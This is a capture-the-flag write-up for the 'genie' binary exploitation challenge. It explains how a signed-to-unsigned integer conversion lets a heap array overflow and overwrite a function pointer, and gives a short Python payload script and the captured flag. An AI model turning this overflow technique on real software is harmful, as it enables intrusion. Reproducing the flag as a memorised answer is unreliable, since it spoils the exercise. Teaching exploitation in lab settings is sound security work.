## Genie

[genie](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/genie/genie)  
[genie.c](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/genie/genie.c)

> By looking at the code, we can immediately tell that we have to enter the `execute_genie()` function as it prints out the flag.

```C
void execute_genie() {
    puts("Hues bowed to the sky.");
    puts("Alluring thousands of eyes.");
    puts("A magical dyes.");
    system("cat /home/genie/flag.txt");
}
```

> The next thing is to look out for potential vulnerabilities in the code.

```C
struct magicPouch {
    unsigned char guesses[48];
    void (*release)();
};
```

> From the struct above, we can tell that the guesses are stored 1 by 1 in the magic pouch in an array of size 48. If we are able to overflow the array, we can override into `(*release)`.

```C
int main() {

  ...
  ...
  int number;
  printf("Force is strong all around forty-eight; how many guesses would you like to make? ");
  scanf("%d", &number);

  if (number > 48) {
      puts("You ask Genie for the impossible.\n");
      number = 0;
    } else {
      askGenie(little_magicPouch, number);
    }  
  ...
  ...

}
```
> Moreover, there is also a restriction on the number of guesses to be less than 48.

> However, if we input -1, the number of guesses becomes infinite because the number variable is a signed integer, which is then passed into `askGenie()`, a function that takes an unsigned integer as input. (-1 is a very big number when unsigned)

```C
void askGenie(struct magicPouch * mp, unsigned int number) {
    printf("Genie grants you %d guesses\n", number);

    for (int i = 0; i < number; i++) {
        printf("What is your guess? ");
        unsigned int guess;
        scanf("%d", &guess);
        printf("Guess %d: %d\n", i + 1, guess);
	if (guess == 0) {
	    break;
        }

        mp->guesses[i] = guess & 0x000000ff;
    }
}
```

> This means that in the struct `magicPouch`, we can overflow the array and write into `(*release)` using the 49th-52nd guesses. (As char is 1 byte only) (Overflowing the heap)

> Now we need to decide what to write into the release pointer. Attempting to write the address of the `execute_genie()` function does not work because of this portion of the code.

```C
int main() {

  ...
  ...
  if ((void *)*little_magicPouch -> release >= (void *)&execute_genie) {
    return 0;
  }

  if (number != 0) {
    little_magicPouch -> release();
  }

  free(little_magicPouch);
}
```

> If the address of release is the same as execute_genie, then release() would not run. Hence we cannot simply input its address. However, in the `objdmp`, we can note that there is a `nop` instruction just before execute_genie. A [no-operation](https://en.wikipedia.org/wiki/NOP_(code)) (or nop) instruction, as the name suggests, does nothing. It is used as a placeholder, and will simply just go to the next instruction.

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/genie/objdmp.png)  

> Thus, if we jump to the nop instruction instead (at address `0x4013a8`) which is of a different address from the `execute_genie()` function, the if check will not be fulfilled and we can successfully run execute_genie() to get the flag.

> We have to split the hexadecimal address of nop and convert them to decimal, while also ensuring little endian ordering. Guess 52 is 0 to break out of the loop.

```python
print("-1")
for i in range(48):
    print("1")
print(int("0xa8", base=16)) # Guess 49: 168
print(int("0x13", base=16)) # Guess 50: 19
print(int("0x40", base=16)) # Guess 51: 64
print("0")
```
[exploit.py](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/genie/exploit.py)

> We can use the stdout as our input to the genie executable as follows:

```
python3 exploit.py > genieinput
./genie < genieinput
```

![image](https://github.com/Rookie441/CTF/blob/main/Categories/Binary%20Exploitation/Medium/genie/Solved.png)  

`CS2107{y0u_4r3_the_rEAL_gEn1e}`
